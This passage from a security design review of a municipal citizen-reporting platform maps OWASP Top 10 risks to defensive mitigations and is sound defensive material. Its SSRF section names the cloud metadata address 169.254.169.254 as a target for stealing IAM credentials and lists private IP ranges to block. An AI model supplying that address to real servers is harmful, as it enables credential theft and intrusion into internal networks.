Media ingestion architectures rely heavily on native binary parsing libraries (e.g., libpng, libjpeg-turbo, libvips, Pillow, Sharp) to process and convert uploaded images. These third-party C and C++ decoders frequently contain memory-safety vulnerabilities, including buffer overflows and memory corruption bugs that can lead to remote code execution.   

Implementable Engineering Mitigations

Integrate automated Software Composition Analysis (SCA) tooling (such as Snyk, GitHub Dependabot, or Trivy) directly into the CI/CD pipeline to flag vulnerable dependencies and fail builds containing known CVEs. Deploy application microservices using minimal, containerized runtime images (such as Alpine Linux or distroless images) to reduce the installed component footprint. Maintain an automated patching process to apply security updates for core runtime environments and native libraries within 24–48 hours of upstream release.

A07:2021 – Identification and Authentication Failures
Applicability Assessment

Municipal staff accounts have access to dispatch workflows, emergency resource scheduling, and citizen identification records. These accounts are prime targets for brute-force attacks, credential stuffing, and session hijacking.   

Implementable Engineering Mitigations

Require Multi-Factor Authentication (MFA) for all municipal staff, using phishing-resistant FIDO2/WebAuthn hardware tokens as the primary factor. Enforce password policies meeting NIST SP 800-63B guidelines: a 15-character minimum length, full Unicode support, and automated screening against breach databases via the HaveIBeenPwned API. Store password hashes using memory-hard Argon2id or bcrypt functions. Issue session tokens with at least 128 bits of entropy via CSPRNG, delivered inside __Host- prefixed cookies with Secure, HttpOnly, and SameSite=Strict flags. Enforce an idle session timeout of 15 minutes and an absolute maximum session duration of 8 to 12 hours.   

A08:2021 – Software and Data Integrity Failures
Applicability Assessment

This risk applies to mobile client integrity, background task processing, and deployment pipelines. Attackers can reverse-engineer mobile clients to submit fabricated telemetry, or target insecure object deserialization within asynchronous background task workers (e.g., Celery/Redis) to execute arbitrary code.   

Implementable Engineering Mitigations

Enforce hardware-backed device attestation (Google Play Integrity API and Apple App Attest) to verify that incoming client requests originate from unmodified applications. Prohibit unsafe language-native object serialization formats (such as Python pickle or Java native serialization) in background queues; use strict data-only formats such as JSON or Protocol Buffers. Sign container images and deployment artifacts cryptographically (using Sigstore Cosign) within the CI/CD pipeline, and verify signatures before deploying to production. Implement Subresource Integrity (SRI) hashes on all external scripts and stylesheets loaded by the dashboard frontend.   

A09:2021 – Security Logging and Monitoring Failures
Applicability Assessment

Without comprehensive logging and monitoring, unauthorized administrative actions, account compromise, and automated data scraping can persist undetected for months, hindering incident response and forensic analysis.   

Implementable Engineering Mitigations

Implement a centralized audit logging system following NIST SP 800-92 standards. Capture structured audit logs for all security-relevant events, including authentication attempts, permission modifications, record reads, and administrative status changes. Automatically sanitize logs at the application layer to prevent citizen PII, authentication tokens, and precise coordinates from leaking into log stores. Stream audit logs in real time to an append-only, Write-Once-Read-Many (WORM) storage system (e.g., Amazon S3 Object Lock) to prevent an attacker from modifying or deleting historical audit records. Configure automated alerting for anomalous operational metrics, such as elevated 401/403 HTTP error rates, unexpected spikes in report volume, or mass ticket state changes.   

A10:2021 – Server-Side Request Forgery (SSRF)
Applicability Assessment

Server-Side Request Forgery risks arise if the platform allows citizens to supply external image URLs instead of uploading files directly, or if the municipal system sends automated webhooks to external contractor work-order systems. An attacker can supply loopback addresses or cloud metadata endpoints (http://169.254.169.254/) to steal IAM credentials or scan internal municipal network services.   

Implementable Engineering Mitigations

Prohibit file ingestion via remote URLs, requiring users to upload image files directly through approved storage channels. For outbound municipal webhooks communicating with external contractor systems, implement strict egress network filtering: resolve hostnames and verify that destination IP addresses do not fall within private, reserved, or loopback ranges (e.g., 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, and ::1). Route outbound webhook traffic through dedicated egress proxies, and disable automatic HTTP redirect handling to prevent attackers from bypassing initial address checks.   

Architectural Synthesis

The secure operation of a municipal citizen reporting architecture requires treating all client inputs—whether binary media files, spatial coordinates, or identity claims—as untrusted and potentially hostile.   

By decoupling media ingestion from core application servers, sanitizing metadata while maintaining correct image orientation, validating hardware integrity via mobile attestation APIs, and isolating administrative dashboard controls behind zero-trust network protections, municipalities can safeguard citizen privacy and protect civic infrastructure from service degradation and compromise.
